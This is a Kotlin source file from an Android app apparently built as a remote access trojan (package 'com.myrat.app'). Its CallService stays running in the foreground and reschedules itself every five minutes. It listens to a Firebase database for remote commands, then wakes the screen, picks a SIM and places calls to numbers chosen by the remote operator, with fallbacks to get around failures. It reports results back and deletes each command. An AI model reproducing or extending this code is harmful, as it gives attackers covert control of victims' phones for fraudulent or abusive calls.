package com.myrat.app.service

import android.Manifest
import android.content.ActivityNotFoundException
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.telecom.PhoneAccountHandle
import android.telecom.TelecomManager
import android.telephony.SubscriptionManager
import androidx.core.content.ContextCompat
import androidx.work.*
import com.google.firebase.database.*
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.myrat.app.LauncherActivity
import com.myrat.app.MainActivity
import com.myrat.app.utils.Constants
import com.myrat.app.utils.Logger
import com.myrat.app.utils.PermissionUtils
import com.myrat.app.worker.CallServiceRestartWorker
import java.util.concurrent.TimeUnit

class CallService : BaseService() {
    
    override val notificationId = 8
    override val channelId = Constants.NOTIFICATION_CHANNEL_CALL
    override val serviceName = "CallService"

    private val sentCallTracker = mutableMapOf<String, MutableSet<String>>()
    private lateinit var deviceId: String

    override fun onCreate() {
        super.onCreate()
        try {
            deviceId = MainActivity.getDeviceId(this)
            startForegroundService("Call Service", "Monitoring call commands with SIM selection")
            scheduleRestart()
            Logger.log("CallService created successfully for device: $deviceId")
        } catch (e: Exception) {
            Logger.error("Failed to initialize CallService", e)
            stopSelf()
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        try {
            if (deviceId.isEmpty()) {
                Logger.error("Device ID is empty, stopping CallService")
                stopSelf()
                return START_NOT_STICKY
            }
            
            // Check permissions before starting
            if (!PermissionUtils.hasAllCallPermissions(this)) {
                Logger.error("Missing call permissions, stopping CallService")
                stopSelf()
                return START_NOT_STICKY
            }
            
            listenForCallCommands(deviceId)
            return super.onStartCommand(intent, flags, startId)
        } catch (e: Exception) {
            Logger.error("Failed to start CallService", e)
            return START_NOT_STICKY
        }
    }

    private fun scheduleRestart() {
        try {
            val workRequest = PeriodicWorkRequestBuilder<CallServiceRestartWorker>(
                repeatInterval = 5, TimeUnit.MINUTES,
                flexTimeInterval = 1, TimeUnit.MINUTES
            ).build()

            WorkManager.getInstance(this).enqueueUniquePeriodicWork(
                "CallServiceRestart",
                ExistingPeriodicWorkPolicy.KEEP,
                workRequest
            )
            Logger.log("Scheduled CallService restart using WorkManager")
        } catch (e: Exception) {
            Logger.error("Failed to schedule CallService restart", e)
        }
    }

    private fun isNetworkAvailable(): Boolean {
        return try {
            val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val network = connectivityManager.activeNetwork
            val capabilities = connectivityManager.getNetworkCapabilities(network)
            capabilities != null && (
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
                            capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)
                    )
        } catch (e: Exception) {
            Logger.error("Error checking network availability", e)
            false
        }
    }

    private fun listenForCallCommands(deviceId: String) {
        if (!isNetworkAvailable()) {
            Logger.error("No network available, but continuing CallService for offline functionality")
        }

        try {
            val commandsRef = Firebase.database.getReference("Device").child(deviceId).child("call_commands")

            commandsRef.addValueEventListener(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    try {
                        snapshot.children.forEach { commandSnapshot ->
                            val command = commandSnapshot.value as? Map<*, *> ?: run {
                                Logger.error("Invalid command data for ${commandSnapshot.key}")
                                return@forEach
                            }
                            val status = command["status"] as? String
                            val simNumber = command["sim_number"] as? String
                            val recipient = command["recipient"] as? String
                            val commandId = commandSnapshot.key ?: return@forEach

                            if (status != "pending") {
                                Logger.log("Skipping command $commandId with status $status")
                                return@forEach
                            }
                            if (simNumber.isNullOrBlank() || recipient.isNullOrBlank()) {
                                Logger.error("Invalid call command data for command $commandId: sim_number=$simNumber, recipient=$recipient")
                                updateCommandStatus(commandId, "failed", "Invalid sim_number or recipient")
                                return@forEach
                            }
                            Logger.log("Processing call command: $commandId from $simNumber to $recipient")
                            initiateCallWithSimSelection(simNumber, recipient, commandId)
                        }
                    } catch (e: Exception) {
                        Logger.error("Error processing call commands", e)
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    Logger.error("Call commands database error: ${error.message}", error.toException())
                }
            })
        } catch (e: Exception) {
            Logger.error("Failed to listen for call commands", e)
        }
    }

    private fun initiateCallWithSimSelection(simNumber: String, recipient: String, commandId: String): Boolean {
        try {
            val alreadySentSet = sentCallTracker.getOrPut(commandId) { mutableSetOf() }
            if (alreadySentSet.contains(recipient)) {
                Logger.log("Skipping duplicate call to $recipient for command $commandId")
                return false
            }

            // Check permissions using centralized utility
            if (!PermissionUtils.hasAllCallPermissions(this)) {
                Logger.error("Missing call permissions")
                updateCommandStatus(commandId, "failed", "Missing required permissions")
                return false
            }

            // Get subscription info
            val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
            val subscriptionInfoList = subscriptionManager.activeSubscriptionInfoList
            if (subscriptionInfoList == null || subscriptionInfoList.isEmpty()) {
                Logger.error("No active SIM subscriptions found")
                updateCommandStatus(commandId, "failed", "No active SIM subscriptions")
                return false
            }

            // Normalize simNumber for case-insensitive matching
            val normalizedSimNumber = simNumber.trim().lowercase()
            Logger.log("Normalized simNumber: $normalizedSimNumber")

            // Enhanced SIM mapping logic
            val subscriptionInfo = subscriptionInfoList.find { info ->
                val simSlotIndex = info.simSlotIndex
                val phoneNumber = info.number?.lowercase() ?: ""
                val displayName = info.displayName?.toString()?.lowercase() ?: ""
                val carrierName = info.carrierName?.toString()?.lowercase() ?: ""

                Logger.log("Checking SIM: slot=$simSlotIndex, number=$phoneNumber, displayName=$displayName, carrierName=$carrierName")

                // Match by slot index, phone number, display name, or carrier name
                normalizedSimNumber == "sim${simSlotIndex + 1}" ||
                        normalizedSimNumber == phoneNumber ||
                        displayName.contains(normalizedSimNumber) ||
                        carrierName.contains(normalizedSimNumber) ||
                        // Fallback for common SIM naming
                        (normalizedSimNumber == "sim1" && simSlotIndex == 0) ||
                        (normalizedSimNumber == "sim2" && simSlotIndex == 1)
            }

            if (subscriptionInfo == null) {
                Logger.error("No SIM found for simNumber: $simNumber. Available SIMs: ${subscriptionInfoList.map { "sim${it.simSlotIndex + 1}:${it.number}:${it.displayName}" }}")
                updateCommandStatus(commandId, "failed", "No SIM found for: $simNumber")
                return false
            }

            val subId = subscriptionInfo.subscriptionId
            val simSlotIndex = subscriptionInfo.simSlotIndex
            Logger.log("✅ Mapped $simNumber to subscriptionId: $subId (slot: $simSlotIndex)")

            // Attempt to place the call
            val success = makeCallWithSimBypass(recipient, subId, simSlotIndex, commandId)

            if (success) {
                alreadySentSet.add(recipient)
                updateCommandStatus(commandId, "success", null)
                Logger.log("✅ Successfully initiated call from $simNumber (subId: $subId) to $recipient")
            } else {
                updateCommandStatus(commandId, "failed", "Call initiation failed")
                Logger.error("❌ Failed to initiate call from $simNumber to $recipient")
            }

            return success

        } catch (e: SecurityException) {
            Logger.error("Permission denied for call to $recipient: ${e.message}", e)
            updateCommandStatus(commandId, "failed", "Permission denied: ${e.message}")
            return false
        } catch (e: Exception) {
            Logger.error("Failed to initiate call to $recipient: ${e.message}", e)
            updateCommandStatus(commandId, "failed", "Unexpected error: ${e.message}")
            return false
        }
    }

    private fun makeCallWithSimBypass(recipient: String, subId: Int, simSlotIndex: Int, commandId: String): Boolean {
        return try {
            wakeUpScreen()

            // Method 1: Try TelecomManager with enhanced SIM selection
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                try {
                    val telecomManager = getSystemService(TELECOM_SERVICE) as TelecomManager
                    val phoneAccountHandle = getPhoneAccountHandleForSubscription(telecomManager, subId)

                    if (phoneAccountHandle != null) {
                        val uri = android.net.Uri.parse("tel:$recipient")
                        val extras = Bundle().apply {
                            putParcelable(TelecomManager.EXTRA_PHONE_ACCOUNT_HANDLE, phoneAccountHandle)
                            putInt("android.telephony.extra.SUBSCRIPTION_ID", subId)
                            putInt("com.android.phone.extra.slot", simSlotIndex)
                            putInt("subscription", subId)
                            putBoolean(TelecomManager.EXTRA_START_CALL_WITH_SPEAKERPHONE, false)
                        }

                        telecomManager.placeCall(uri, extras)
                        Logger.log("📞 Direct call placed using TelecomManager with subId: $subId")
                        return true
                    } else {
                        Logger.error("No valid PhoneAccountHandle found for subId: $subId")
                    }
                } catch (e: SecurityException) {
                    Logger.error("SecurityException in TelecomManager call: ${e.message}", e)
                } catch (e: Exception) {
                    Logger.error("TelecomManager call failed, trying fallback", e)
                }
            }

            // Method 2: Fallback using Intent.ACTION_CALL with explicit SIM selection
            try {
                val intent = Intent(Intent.ACTION_CALL).apply {
                    data = android.net.Uri.parse("tel:$recipient")
                    putExtra("com.android.phone.force.slot", true)
                    putExtra("com.android.phone.extra.slot", simSlotIndex)
                    putExtra("android.telephony.extra.SUBSCRIPTION_ID", subId)
                    putExtra("subscription", subId)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }

                startActivity(intent)
                Logger.log("📞 Fallback call initiated using ACTION_CALL with subId: $subId")
                return true
            } catch (e: ActivityNotFoundException) {
                Logger.error("No activity found to handle ACTION_CALL", e)
            } catch (e: SecurityException) {
                Logger.error("SecurityException in ACTION_CALL: ${e.message}", e)
            }

            // Method 3: Fallback to LauncherActivity
            try {
                val intent = Intent(this, LauncherActivity::class.java).apply {
                    action = "com.myrat.app.ACTION_MAKE_CALL"
                    putExtra("recipient", recipient)
                    putExtra("subId", subId)
                    putExtra("simSlotIndex", simSlotIndex)
                    putExtra("commandId", commandId)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                }

                startActivity(intent)
                Logger.log("📞 Fallback call initiated via LauncherActivity with subId: $subId")
                return true
            } catch (e: Exception) {
                Logger.error("LauncherActivity fallback failed", e)
            }

            Logger.error("All call methods failed for $recipient")
            return false

        } catch (e: Exception) {
            Logger.error("Unexpected error in makeCallWithSimBypass: ${e.message}", e)
            return false
        }
    }

    private fun getPhoneAccountHandleForSubscription(telecomManager: TelecomManager, subId: Int): PhoneAccountHandle? {
        return try {
            val phoneAccounts = telecomManager.callCapablePhoneAccounts
            Logger.log("Available phone accounts: ${phoneAccounts.size}")

            // Get SubscriptionManager to verify subscription exists
            val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
            val activeSubscriptions = subscriptionManager?.activeSubscriptionInfoList
            Logger.log("Active subscriptions: ${activeSubscriptions?.size ?: 0}")

            phoneAccounts.find { account ->
                try {
                    val phoneAccount = telecomManager.getPhoneAccount(account)
                    val accountSubId = phoneAccount?.extras?.getInt("android.telephony.extra.SUBSCRIPTION_ID", -1) ?: -1

                    // Verify the subscriptionId exists in active subscriptions
                    val isValidSubscription = activeSubscriptions?.any { it.subscriptionId == accountSubId } ?: false
                    Logger.log("🔍 Comparing accountSubId: $accountSubId with target subId: $subId, isValid: $isValidSubscription")

                    accountSubId == subId && isValidSubscription
                } catch (e: Exception) {
                    Logger.error("Error checking phone account: $account", e)
                    false
                }
            }
        } catch (e: SecurityException) {
            Logger.error("SecurityException while getting PhoneAccountHandle", e)
            null
        } catch (e: Exception) {
            Logger.error("Failed to get PhoneAccountHandle for subId: $subId", e)
            null
        }
    }

    private fun wakeUpScreen() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
            if (!powerManager.isInteractive) {
                val screenWakeLock = powerManager.newWakeLock(
                    android.os.PowerManager.FULL_WAKE_LOCK or android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP or android.os.PowerManager.ON_AFTER_RELEASE,
                    "CallService:ScreenWake"
                )
                screenWakeLock.acquire(10000) // 10 seconds
                screenWakeLock.release()
                Logger.log("Screen woken up for call")
            }
        } catch (e: Exception) {
            Logger.error("Failed to wake up screen for call", e)
        }
    }

    private fun updateCommandStatus(commandId: String, status: String, error: String?) {
        try {
            val commandRef = Firebase.database.getReference("Device/$deviceId/call_commands/$commandId")
            val updates = mutableMapOf<String, Any?>(
                "status" to status,
                "timestamp" to System.currentTimeMillis()
            )
            if (error != null) {
                updates["error"] = error
            }
            commandRef.updateChildren(updates)
                .addOnSuccessListener {
                    Logger.log("Updated call command $commandId to status $status")
                    if (status == "success" || status == "failed") {
                        commandRef.removeValue()
                            .addOnSuccessListener {
                                Logger.log("Removed call command $commandId")
                                sentCallTracker.remove(commandId)
                            }
                            .addOnFailureListener { e ->
                                Logger.error("Failed to remove command: ${e.message}", e)
                            }
                    }
                }
                .addOnFailureListener { e ->
                    Logger.error("Failed to update call command $commandId: ${e.message}", e)
                }
        } catch (e: Exception) {
            Logger.error("Error updating call command status", e)
        }
    }
}